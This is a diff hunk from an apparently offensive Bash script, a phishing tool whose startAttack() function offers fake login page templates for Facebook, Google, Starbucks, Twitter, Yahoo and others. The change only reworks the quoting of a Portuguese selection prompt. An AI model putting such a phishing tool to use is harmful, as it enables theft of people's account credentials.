@@ -148,7 +148,7 @@ function startAttack(){
         plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
 
         tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Se você quiser usar seu próprio modelo, crie outro diretório no projeto e especifique seu nome :)${endColour}\n\n"
-        echo -ne "${yellowColour}[*]${endColour}${grayColour} Modelo ${endColour}\n\n" a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
+        echo -ne "${yellowColour}[*]${endColour}${grayColour} "Modelo ${endColour}\n\n" a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi)":${endColour} " && read template
 
         check_plantillas=0; for plantilla in "${plantillas[@]}"; do
                 if [ "$plantilla" == "$template" ]; then
